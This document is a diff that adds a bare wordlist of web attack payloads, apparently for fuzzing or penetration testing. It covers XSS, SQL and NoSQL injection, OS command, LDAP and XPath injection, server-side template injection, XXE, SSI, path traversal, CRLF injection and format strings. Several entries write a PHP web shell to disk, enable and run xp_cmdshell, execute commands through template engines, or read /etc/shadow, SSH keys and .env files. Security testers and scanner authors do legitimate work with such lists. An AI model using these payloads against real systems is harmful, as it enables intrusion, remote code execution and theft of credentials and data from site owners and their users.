@@ -1,0 +1,554 @@
+'"<>
+"><svg/onload=confirm(1)>
+xssTEST123
+<script>alert(1)</script>
+<script>alert(1)//
+<script/src=data:,alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)//
+<img src=1 onload=alert(1)>
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><script>alert(1)</script></svg>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<a href="java&#9;script:alert(1)">x</a>
+" onmouseover=alert(1) x="
+" autofocus onfocus=alert(1) x="
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+" onmouseover=alert(1) "
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+' autofocus onfocus=alert(1) x='
+' onmouseover=alert(1) '
+'><script>alert(1)</script>
+x onmouseover=alert(1)
+/onmouseover=alert(1)//
+javascript:alert(1)
+javascript:alert(1)//
+JaVaScRiPt:alert(1)
+ javascript:alert(1)
+%09javascript:alert(1)
+&#x6a;avascript:alert(1)
+"><iframe srcdoc="<script>alert(1)</script>">
+alert(1)
+alert(1);//
+'-alert(1)-'
+"-alert(1)-"
+"><svg style="background:url(javascript:alert(1))"
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+';alert(1)//
+';alert(1);//
+\\';alert(1)//
+";alert(1)//
+";alert(1);//
+\\";alert(1)//
+${alert(1)}
+`+alert(1)+`
+${alert`1`}
+1;alert(1)
+0||alert(1)
+1+alert(1)+1
+\"});alert(1);//
+</script><script>alert(1)</script>
+);alert(1);(
+});alert(1);//
+});alert(1);({
+\\';alert(1);//
+\n;alert(1)//
+ alert(1)
+ alert(1)
+java%0ascript:alert(1)
+javascript&colon;alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+');alert(1)//
+");alert(1)//
+\';alert(1)//
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+<form id=x><input id=attributes>
+<a id=x name=y href=//evil>
+<form><button formaction=javascript:alert(1)>x
+<a href=javascript:alert(1)>x</a>
+\";alert(1);//
+`}+alert(1)+`
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<svg\x09onload=alert(1)>
+<svg\x0Conload=alert(1)>
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#x3Cscript&#x3Ealert(1)&#x3C/script&#x3E
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+<svg onload=window['ale'+'rt'](1)>
+<svg onload=window['\x61lert'](1)>
+<img src=x onerror=top["al"+"ert"](1)>
+<svg onload=alert`1`>
+<img src=x onerror=alert`1`>
+<svg onload=throw onerror=alert,1>
+<svg onload=location='javascript:alert(1)'>
+<svg><script xlink:href=data:,alert(1) />
+<svg><use href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIGlkPSd4Jz48aW1hZ2UgaHJlZj0nMScgb25lcnJvcj0nYWxlcnQoMSknIC8+PC9zdmc+#x"/>
+<scri%00pt>alert(1)</scri%00pt>
+<img src=x onerror=\x00alert(1)>
+<svg/onload=&#97&#108&#101&#114&#116(1)>
+<a href="javascript:%0aalert(1)">x</a>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(/aler/.source+/t(1)/.source)>
+<svg/onload=alert?.(1)>
+<svg onload="(()=>alert(1))()">
+<a onmouseover&#x3D;alert(1)>x
+<svg onload&#x3D;alert(1)>
+<!--><svg onload=alert(1)>
+<! --><svg onload=alert(1)>
+<a"<b><script>alert(1)</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"><svg onload=alert(1)>"-alert(1)-"
+--><svg onload=alert(1)>
+*/alert(1)/*
+*/</script><svg onload=alert(1)>
+'"--></style></script><script>alert(1)</script>
+\';alert(1);//<svg onload=alert(1)>
+[xss](javascript:alert(1))
+![xss](javascript:alert(1))
+=HYPERLINK("javascript:alert(1)","click")
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+'
+"
+\
+;
+')
+")
+'))
+';--
+'-- -
+' OR '1'='1
+' OR '1'='1'-- -
+' OR 1=1-- -
+' AND '1'='2
+" OR "1"="1
+1 OR 1=1
+1) OR (1=1
+admin'-- -
+admin'#
+' OR ''='
+' OR 1=1 LIMIT 1-- -
+admin' OR '1'='1'#
+' UNION SELECT 'admin','admin'-- -
+" OR ""="
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' ORDER BY 1-- -
+' ORDER BY 100-- -
+' GROUP BY 1-- -
+'; DROP TABLE users-- -
+'; SELECT pg_sleep(5)-- -
+'+convert(int,@@version)+'
+' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+') OR ('1'=('1
+1' AND 1=1 UNION SELECT 1,2,3--+
+'/**/OR/**/'1'='1
+'%09OR%091=1-- -
+'%0AOR%0A1=1-- -
+'+UnIoN+SeLeCt+1,2,3-- -
+'/*!UNION*/+/*!SELECT*/+1,2,3-- -
+' AND SLEEP(5)-- -
+' AND IF(1=1,SLEEP(5),0)-- -
+' OR SLEEP(5)-- -
+' AND BENCHMARK(5000000,MD5('a'))-- -
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+' UNION SELECT @@version,user(),database()-- -
+' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),2,3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
+' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3-- -
+' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/x.php'-- -
+'#
+'/*
+'%23
+'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
+'UNION(SELECT(1),(2),(3))-- -
+admin' AND 1=0 UNION SELECT 1,'admin',MD5('password')-- -
+'; WAITFOR DELAY '0:0:5'-- -
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+'; IF (LEN(DB_NAME())>0) WAITFOR DELAY '0:0:5'-- -
+' AND 1=CONVERT(int,@@version)-- -
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))-- -
+'; SELECT 1/0-- -
+' UNION SELECT @@version,user_name(),db_name()-- -
+' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U'-- -
+' UNION SELECT name,2,3 FROM syscolumns WHERE id=OBJECT_ID('users')-- -
+'; EXEC xp_cmdshell 'whoami'-- -
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
+' OR (SELECT pg_sleep(5)) IS NOT NULL-- -
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+' AND 1=CAST(version() AS int)-- -
+' AND 1=CAST((SELECT current_user) AS int)-- -
+' UNION SELECT version(),current_user,current_database()-- -
+' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/x'-- -
+'; DROP TABLE IF EXISTS x; CREATE TABLE x(c text); COPY x FROM PROGRAM 'id'-- -
+' UNION SELECT pg_read_file('/etc/passwd'),2,3-- -
+'; CREATE TABLE x(c text); COPY x FROM '/etc/passwd'-- -
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
+' UNION SELECT banner,NULL,NULL FROM v$version-- -
+' UNION SELECT table_name,NULL,NULL FROM all_tables-- -
+' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
+' AND 1=1-- -
+' AND 1=2-- -
+' AND randomblob(100000000)-- -
+' AND (SELECT count(*) FROM sqlite_master,sqlite_master,sqlite_master)-- -
+' UNION SELECT sqlite_version(),2,3-- -
+' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'-- -
+' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'-- -
+'; SELECT load_extension('/tmp/lib.so','entry')-- -
+'; ATTACH DATABASE '/var/www/x.php' AS x; CREATE TABLE x.y(c text); INSERT INTO x.y VALUES('<?php system($_GET[0]);?>')-- -
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":"admin","password":{"$ne":""}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$regex":".*"}}
+{"username":"admin","password":{"$exists":true}}
+username[$ne]=foo&password[$ne]=foo
+username[$regex]=^adm&password[$ne]=foo
+username=admin&password[$gt]=
+{"$where":"this.password=='a'||'1'=='1'"}
+{"username":"admin","$where":"sleep(5000)"}
+';return(true);var x='
+';sleep(5000);var x='
+0;return true
+1;return true
+{"username":{"$regex":"^a"},"password":{"$ne":""}}
+{"username":"admin","password":{"$regex":"^a.*"}}
+*:*
+%0d%0aCONFIG%20SET%20dir%20/tmp%0d%0a
+;id
+|id
+&&id
+||id
+`id`
+$(id)
+;`id`
+&whoami
+|whoami
+&&whoami
+||whoami
+%0aid
+%0a/bin/id
+%0d%0aid
+;sleep 5
+|sleep 5
+`sleep 5`
+$(sleep 5)
+;ping -c 5 127.0.0.1
+%0asleep%205
+&ping -n 5 127.0.0.1
+&timeout /t 5
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+cat</etc/passwd
+c''at /etc/passwd
+c"a"t /etc/passwd
+c\at /etc/passwd
+/bin/c?t /etc/passwd
+/???/??t /etc/passwd
+/bin/[c]at /etc/passwd
+cat${IFS}\$(echo${IFS}-e${IFS}'\x2fetc\x2fpasswd')
+/???/??t /???/p??s??
+;id|`id`&id&&id||id
+*
+(
+)
+*)(
+*))%00
+*)(uid=*))(|(uid=*
+*)(|(password=*))
+admin)(&(password=*))
+admin)(!(&(1=0)))
+*)(|(objectclass=*))
+*)(|(cn=*))
+*)(|(uid=*))
+*))(|(cn=*
+*)(uid=a*))(|(uid=*
+*)(uid=ab*))(|(uid=*
+admin*
+\28
+\29
+\5c
+\2a
+admin')-- -
+)(cn=))\x00
+)(|(password=*))
+*)(uid=*
+'"
+]
+'](
+' or '1'='1
+' or 1=1 or ''='
+'] | //user[username/text()='admin' and ''='
+' or name(.)='username
+admin' or '1'='1
+admin'/*
+' and '1'='1
+' and '1'='2
+' and string-length(name(/*[1]))=4 and ''='
+' and substring(name(/*[1]),1,1)='r' and ''='
+' or count(/*)=1 or ''='
+' or count(//user)>0 or ''='
+${{<%[%'"}}%\
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+*{7*7}
+@(7*7)
+[[${7*7}]]
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{ self.__init__.__globals__.__builtins__ }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|map('system')|join}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{$smarty.version}
+{php}echo `id`;{/php}
+{system('id')}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
+<%= system('id') %>
+<%= `id` %>
+<%= File.open('/etc/passwd').read %>
+<%= IO.popen('id').read() %>
+<%import os; x=os.popen('id').read()%>${x}
+${self.module.cache.util.os.system("id")}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+[[${T(java.lang.Runtime).getRuntime().exec("id")}]]
+@(1+2)
+@{// C# code }
+{{7 | times: 7}}
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY x '%d;'>">%e;]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>
+<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
+<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY x SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body>&x;</soap:Body></soap:Envelope>
+<!--#printenv -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#include virtual="/etc/passwd" -->
+<!--#include file="../../etc/passwd" -->
+<!--#exec cmd="id" -->
+<!--#exec cmd="ls /" -->
+<!--#exec cmd="whoami" -->
+;system('id');//
+;phpinfo();//
+'.system('id').'
+${@phpinfo()}
+${system('id')}
+__import__('os').system('id')
+__import__('os').popen('id').read()
+().__class__.__bases__[0].__subclasses__()
+exec("import os; os.system('id')")
+cos\nsystem\n(S'id'\ntR.
+system('id')
+%x(id)
+eval('`id`')
+require('child_process').execSync('id').toString()
+process.mainModule.require('child_process').execSync('id')
+this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")
+${@java.lang.Runtime@getRuntime().exec("id")}
+%{(#cmd='id').(#p=new java.lang.ProcessBuilder({'sh','-c',#cmd}))}
+;process.exit()
+);process.mainModule.require('child_process').execSync('id');//
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/resolv.conf
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/version
+/proc/cpuinfo
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/root/.bash_history
+/root/.ssh/id_rsa
+/home/user/.ssh/id_rsa
+/var/www/html/.env
+/var/www/html/wp-config.php
+C:\Windows\win.ini
+C:\Windows\system32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\repair\SAM
+C:\Windows\debug\NetSetup.LOG
+C:\inetpub\wwwroot\web.config
+C:\boot.ini
+C:\xampp\apache\conf\httpd.conf
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+file:///etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
+phar://test.phar/file
+zip://test.zip#file
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+..%2f
+%2e%2e%2f
+..%252f
+%2e%2e/
+..\
+..%5c
+%2e%2e%5c
+%252e%252e%252f
+%252e%252e/
+..%c0%af
+..%c1%9c
+....//
+....\\\\
+....\/
+..../\
+..;/
+..//
+../../../etc/passwd%00.png
+../../../etc/passwd#.png
+../../../etc/passwd?.png
+%c0%2e%c0%2e/
+%e0%80%ae%e0%80%ae/
+%0d%0a
+%0a
+%0d
+%23%0d%0a
+%3f%0d%0a
+%0d%0aSet-Cookie:%20injected=1
+%0d%0aContent-Length:%200%0d%0a%0d%0a
+%0d%0aX-Injected:%20test
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2032%0d%0a%0d%0a<script>alert(1)</script>
+%250d%250a
+%25250d%25250a
+%u000d%u000a
+%e5%98%8a%e5%98%8d
+%c4%8d%c4%8a
+%0d%0a%0d%0a<svg onload=alert(1)>
+localhost
+GET
+POST
+PUT
+DELETE
+PATCH
+OPTIONS
+HEAD
+PROPFIND
+TRACE
+TRACK
+CONNECT
+DEBUG
+X-HTTP-Method-Override: PUT
+X-HTTP-Method: DELETE
+X-Method-Override: PUT
+?id=1&id=2
+?id=1&id=2&id=3
+?id[]=1&id[]=2
+?user=admin&user=guest
+?role=user&role=admin
+?param=safe (POST: param=<payload>)
+?id[0]=1&id[1]=2
+?id.0=1&id.1=2
+?id=1,2,3
+?id=1%26id=2
+?id=1%3Bid=2
+?cmd=ls&cmd=id
+</style><script>alert(1)</script>
+*/}</style><svg onload=alert(1)>
+expression(alert(1))
+target.postMessage('<img src=x onerror=alert(1)>','*')
+target.postMessage(JSON.stringify({cmd:'eval',data:'alert(1)'}),'*')
+__proto__
+constructor
+{"type":"__proto__","value":1}
+https://eviltarget.com
+null
+https://target.com:1337
+file://
+Origin: null
+{"cmd":"exec","data":"alert(1)"}
+%x
+%x.%x.%x.%x
+%s
+%s.%s.%s.%s
+%p
+%p.%p.%p.%p
+AAAA.%p.%p.%p.%p
+%n
+AAAA%n
+%hn
+%hhn
+%1$x
+%2$x
+%3$x.%4$x.%5$x
+%S
+%lx
+%x%x%x%x%x%x%x%x%x%x
+zZ1xCanaryAlpha
+zZ2xCanary'"<>
+zZ3xCanary{{7*7}}
+zZ4xCanary${7*7}
+zZ5xCanary[[7*7]]
+zZ6xCanary<%=7*7%>
+zZ7xCanary'OR'1'='1
+zZ8xCanary<svg/onload=alert(1)>
+zZ9xCanary../../../etc/passwd
+zZAxCanary%0d%0aX-Injected:1
